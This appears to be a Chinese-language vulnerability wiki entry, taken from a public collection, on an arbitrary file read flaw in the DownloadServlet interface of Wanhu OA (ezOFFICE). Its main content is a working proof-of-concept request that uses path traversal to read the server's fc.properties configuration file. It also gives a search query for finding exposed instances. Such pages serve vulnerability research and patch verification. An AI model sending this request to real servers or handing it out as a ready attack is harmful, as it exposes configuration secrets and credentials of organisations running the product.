---
title: "万户OA DownloadServlet 任意文件读取漏洞"
date: 2026-10-17 09:12:02
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "万户OA"
tags:
  - "万户OA"
  - "任意文件读取"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

万户OA DownloadServlet接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的敏感文件，获取敏感信息

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131050540.png)

验证POC

```
/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2 
```

![2](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131050803.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%B8%87%E6%88%B7OA-DownloadServlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
